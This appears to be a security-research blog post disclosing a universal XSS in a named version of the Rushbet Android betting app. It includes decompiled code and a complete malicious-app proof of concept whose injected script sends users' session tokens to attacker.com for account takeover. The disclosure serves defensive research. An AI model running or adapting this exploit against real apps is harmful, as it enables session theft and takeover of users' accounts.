---
slug: uxss-to-account-takeover-rushbet/
title: UXSS to Account Takeover in Rushbet
date: 2023-01-12
subtitle: Injecting JS into one site is harmful, into all, lethal
category: attacks
tags: vulnerability, hacking, exploit, software, code
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1673554228/blog/uxss-to-account-takeover-rushbet/cover_rushbet.webp
alt: Photo by sebastiaan stam on Unsplash
description: In this blog post, we present in detail a vulnerability we discovered in Rushbet v2022.23.1-b490616d, along with the steps to follow to replicate the exploit.
keywords: Rushbet, Mobile Application, Android, Session, Vulnerability, Exploit, Cross Site Scripting, Ethical Hacking, Pentesting
author: Carlos Bello
writer: cbello
name: Carlos Bello
about1: Security Researcher
source: https://unsplash.com/es/fotos/RChZT-JlI9g
---

During the 2022 FIFA World Cup,
many people were betting their money in support of their preferred teams.
With this in mind,
I researched which mobile sports betting apps were the most used.

Among all those apps,
I chose Rushbet v2022.23.1-b490616d.
Researching this app,
I discovered that it is possible to steal a user's session token
through a malicious app previously installed on their device.

In this blog post,
I will explain this vulnerability in detail,
where it is found in the code
and what steps need to be followed to replicate the exploit.

## Where is this vulnerability in Rushbet?

Examining the AndroidManifest.xml file,
I found the following exported activity:

```xml
<activity android:theme="@style/AppTheme" android:name="com.sugarhouse.casino.MainActivity" android:exported="true" android:launchMode="singleTop" android:configChanges="fontScale|smallestScreenSize|screenSize|uiMode|screenLayout|orientation|keyboardHidden|keyboard">
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="http" android:host="@string/host_url" android:path="/"/>
        <data android:scheme="http" android:host="@string/host_url" android:pathPrefix="/?"/>
        <data android:scheme="https" android:host="@string/host_url" android:pathPrefix="/?"/>
        <data android:scheme="https" android:host="@string/host_url" android:path="/"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="@string/intent_filter_scheme" android:host="@string/intent_filter_host" android:path="/"/>
        <data android:scheme="@string/intent_filter_scheme_cage" android:host="@string/intent_filter_host_cage"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
    </intent-filter>
</activity>
```

This means
that any app installed on a mobile device
with that vulnerable version of Rushbet
can interact with this activity.

## MainActivity

Once I noticed that,
I went to the exported activity to see what it did and how.
Here,
the application assigns the URL that I send in the intent data
in the variable `this.loadWebviewUrl`:

```java
public final class MainActivity extends Hilt_MainActivity implements [...] {
    // These properties will be used in the onNewIntent listener
    public static final String INTENT_ACTION_EVALUATE_SCRIPT = "Action.EvaluateScript";
    public static final String INTENT_ACTION_EVALUATE_SCRIPT_KEY = "KeyScript";

    [...]

    public void onCreate(Bundle bundle) {
        [...]
        super.onCreate(bundle);
        [...]
        if (activityMainBinding != null) {
            setContentView(activityMainBinding.getRoot());
            [...]
            setWebView();
            [...]
            if (activityMainBinding2 != null) {
                cookieManager.setAcceptThirdPartyCookies(activityMainBinding2.contentMain.activityMainWebview, true);
                Intent intent = getIntent();
                if (intent != null && intent.getData() != null && vf.l.v0(String.valueOf(intent.getData()), HttpHost.DEFAULT_SCHEME_NAME, false)) {
                    this.loadWebviewUrl = String.valueOf(intent.getData());
                }
                [...]
            }
            [...]
        }
        [...]
    }
    [...]
}
```

With the above,
we know
that we can load arbitrary URLs in the WebView:

<image-block>

![“Load arbitrary URLs in the Rushbet WebView”](https://res.cloudinary.com/fluid-attacks/image/upload/v1673554439/blog/uxss-to-account-takeover-rushbet/rushbet-vulnerability-fluid-attacks-a.webp)

</image-block>

This is a good catch,
but it’s got a lot more potential.
I went on
to find the biggest impact this error can have.
Many Android applications allow updating the state
of a previously launched activity
through the `onNewIntent` listener:

```java
public void onNewIntent(Intent intent) {
    String str;
    super.onNewIntent(intent);

    if (intent != null) {
        str = intent.getAction();
    } else {
        str = null;
    }

    if (hd.h.a(str, INTENT_ACTION_EVALUATE_SCRIPT)) {
        String stringExtra = intent.getStringExtra(INTENT_ACTION_EVALUATE_SCRIPT_KEY);
        if (stringExtra == null) {
            return;
        }
        onEvaluateScript(stringExtra);
        return;
    }
    [...]
}
```

By analyzing the logic of the `onEvaluateScript` listener,
I realized that I can inject malicious JS
into the domain previously loaded in the WebView:

```java
public final void onEvaluateScript(String str) {
    try {
        ActivityMainBinding activityMainBinding = this.binding;
        if (activityMainBinding != null) {
            WebView webView = activityMainBinding.contentMain.activityMainWebview;
            // Inject malicious JS here
            webView.evaluateJavascript("try{" + str + "} catch (err) {}", null);
            return;
        }
        hd.h.m("binding");
        throw null;
    } catch (RuntimeException e10) {
        vh.a.f18108a.b(e10, "Failed to evaluateScript already on UI thread", new Object[0]);
    }
}
```

We have before our eyes a universal XSS.
This means we can execute malicious JS code on arbitrary domains.
To activate the `onNewIntent` listener,
we would only need
to add the `Handler().postDelayed()` instruction to our exploit.
This instruction updates the state of the previously launched activity.
An example of this is shown below:

<image-block>

![“Add instruction on Rushbet”](https://res.cloudinary.com/fluid-attacks/image/upload/v1673554440/blog/uxss-to-account-takeover-rushbet/rushbet-vulnerability-fluid-attacks-b.webp)

</image-block>

<cta-banner
  buttontxt="Read more"
  link="/solutions/ethical-hacking/"
  title="Get started with Fluid Attacks' Ethical Hacking solution right now"
/>

## Exploit

To exploit this vulnerability
we must create a malicious application like the following:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:theme="@style/Theme.Badapp"
        tools:targetApi="31">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/app_name"
            android:theme="@style/Theme.Badapp.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

```java
package com.example.badapp;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Handler;
import android.os.Bundle;
import android.net.Uri;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.rush.co.rb","com.sugarhouse.casino.MainActivity");
        intent.setData(Uri.parse("https://rushbet.co/"));
        startActivity(intent);

        new Handler().postDelayed(() -> {
            intent.setAction("Action.EvaluateScript");
            intent.putExtra("KeyScript","fetch('https://attacker.com/sessionID/'+JSON.parse(sessionStorage.getItem('session-COP')).value);");
            startActivity(intent);
        }, 30000);
    }
}
```

## POC of account takeover in Rushbet

The next video shows how to exploit this vulnerability
to obtain the user's sessionID
and then use it to access their account:

<video-block>

<iframe
  src="https://user-images.githubusercontent.com/51862990/204892183-b269011b-8211-40c2-87b0-37b320307180.mp4"
  frameborder="0"
  allowfullscreen
>
</iframe>

</video-block>

And here's a screenshot of our end result:

<image-block>

![“Account takeover in Rushbet”](https://res.cloudinary.com/fluid-attacks/image/upload/v1673557293/blog/uxss-to-account-takeover-rushbet/rushbet-vulnerability-fluid-attacks-c.webp)

</image-block>

## Conclusion

As evidenced in this blog post,
an unauthenticated remote attacker can steal the account
of any user logged into the Rushbet v2022.23.1-b490616d mobile app
for Android
via a malicious app installed on their device.

At Fluid Attacks,
we search for complex vulnerabilities in software.
You can secure your technology
by starting your [21-day free trial](../../free-trial/)
of our automated security testing.
Upgrade at any time
to include assessments by our ethical hackers.
